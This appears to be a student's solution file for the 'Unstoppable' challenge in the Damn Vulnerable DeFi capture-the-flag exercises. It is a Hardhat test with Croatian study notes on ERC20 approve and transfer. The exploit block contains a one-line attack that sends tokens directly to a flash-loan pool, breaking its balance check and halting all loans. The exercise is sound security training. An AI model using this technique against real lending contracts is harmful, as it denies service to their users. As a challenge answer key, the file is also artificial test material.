const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);//owner od contracta je deployer, njemu idu svi tokeni?
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
        /*msg.sender SE DEFUALTNO POSTAVLJA NA PRVOG U NIZU SIGNERSA ODNOSNO NA DEPLOYERA U OVOM SLUCAJU */

        
        //approve jer cemo koristit instancu od token contracta unutar pool contracta koja ce prebacivat tokene s adrese tokena na adresu poola
       //ZAŠTO APPROVAMO POOLU AKO NECE ON BIT TAJ KOJI CE POZIVAT TRANSAKCIJU , AL NIJE DA APPROVAMO ONOME KO CE U NAŠE IME TRASNFERIRAT NAŠE NOVCE 
       //JEL TO ZATO STA CE SE POZIVAT U DRUGOM CONTRACTU PA MORAMO TAKO IAKO JE TAMO INSTANCA this.token contracta?
        //POZIVOM APPROVE NAD CONTRACTOM OD TOKENA DOPUŠTAMO TROŠENJE TOG SEPCIFICČNOG TOKENA I TO OD STRANE ADRESE KOJU STAVIMO U PRVI ARGUMENT -> ovde je to this.pool.adress
       await this.token.approve(this.pool.address, TOKENS_IN_POOL);//dopusti/approvaj contractu na this.pool.adress da moze tamo pozvat trasnfer from funkciji i u njoj prebacit TOKENS_IN_POOL tokena na svoju adresu
        //ovo koristimo jer se poziva funkcija za transfer u drugom contractu a cisti trasnfer omogucavamo samo direktni prijenos s ovog contracta na drugi
        await this.pool.depositTokens(TOKENS_IN_POOL);
        //sta ako bi pozvali direktno transfer na pool, jel bi on to zna primit
        //KAKO UOPCE SMART CONTRACTSI ZNAJU PRIMIT TOKENE, JEL TRIBA POSEBNA RECEIVE ILI FALLBACK FUNKCIJA? -> POTREBNO IMAT PAYABLE FUNKCIJU KOJA SE POZIVA I KOD SLANJA I KOD PRIMANJA
        //KAKO BI SE ONDA POVUKLI TI TOKENA S CONTRACTA NA NAŠE RAČUNE NPR AKO OWNER OCE WITHDRAWAT
        //TAMO KOD FUNDME PRIMJERA JE KORISTEN TRANSFER AL SAMO SA AMMOUNT
        //msg.sender.transfer(address(this).balance); PRI ČEMU JE msg.sneder vlasnik contrata odnosno on poziva tu funkciju
        //OVDE GOVORIMO O SOLIDTY transfer funkciji A NE O TRANSFER FUNKCIJI SMART CONTRACTA OD IERC20 TOKENA
        //ONA JE adresaprimatelja.transfer(ammount) i POMOĆU NJE SE IZVLAČE SREDSTVA IZ SAMOG SMART CONTRACTA
        //SVE OSTALO DI KORISTIMO ADRESU CONTRACTA pa na njoj pozivamo transfer funkcije od tog contracta ide po principu da je defaultni sender vlasnik tokena a receipeient koga stavimo, NE IZLVACI SE IZ CONTRACTA NISTA, JEDINO AKO UNUTAR TOG POZIVA NIJE TAKO SPECIFICRANO

        //JE LI TRASNFER PRENOSI S ADRESE CALLERA NA ADRESU RECEIPIENTA ODNOSNO AKO NE STAVIMO 'from':account onda contract AUTOMATSKI ZA SENDERA UZME OWNERA OD CONTRACTA I ŠALJE S NJEGOVOG RAČUNA
        //JE LI ONDA CONTRACT RADI SAMO NA SVOJIM TOKENIMA ODNOSNO PRENOSI SAMO SVOJE TOKENE
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        /*opcija trasnfera sa overrides argumentima:
        from: the Account that the transaction is sent from. If not given, the transaction is sent from the account that deployed the contract.
        -> ako zelimo poslat tokene definirane nad zadanin ugovorom na neki drugi račun s našeg računa onda specificiramo from jer bi se inače prenosile s onoga ko je deploya contract odnosno kome su mintani tokeni
         */

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
